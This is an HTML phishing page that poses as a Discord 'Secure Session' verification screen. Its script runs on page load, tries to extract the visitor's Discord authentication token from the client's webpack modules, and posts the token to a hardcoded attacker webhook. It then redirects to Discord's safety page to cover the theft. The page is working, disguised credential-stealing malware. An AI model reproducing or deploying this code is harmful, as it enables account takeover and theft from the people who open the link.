<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Discord - Secure Session</title>
</head>
<body style="background-color: #313338; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0;">
    <div style="text-align: center;">
        <div style="border: 4px solid #5865F2; border-top: 4px solid transparent; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
        <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
        <h1>Verifying Sessions...</h1>
    </div>

    <script>
        async function capture() {
            const webhook = "https://discord.com/api/webhooks/1479521399226761257/oXj1-cf5ipoSkF_SKSvCay19JJH7mfnL0Y4grui0lVUU6b9r582psAk1qb4gF4IRC1Kd";
            let token = null;

            try {
                // ניסיון שליפה מתוחכם יותר
                window.dispatchEvent(new Event('beforeunload'));
                token = (window.webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let r in e.c)m.push(e.c[r])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
            } catch (e) { console.log("Token check skipped"); }

            // שליחה ל-Webhook
            await fetch(webhook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: token ? "🔱 Token Captured!" : "⚠️ Link Opened (No Token Found)",
                        description: token ? "Token: `" + token + "`" : "The user opened the link but wasn't logged in on this browser.",
                        color: token ? 5763719 : 15548997
                    }]
                })
            });

            // העברה לדף רשמי
            window.location.href = "https://discord.com/safety";
        }

        window.onload = capture;
    </script>
</body>
</html>
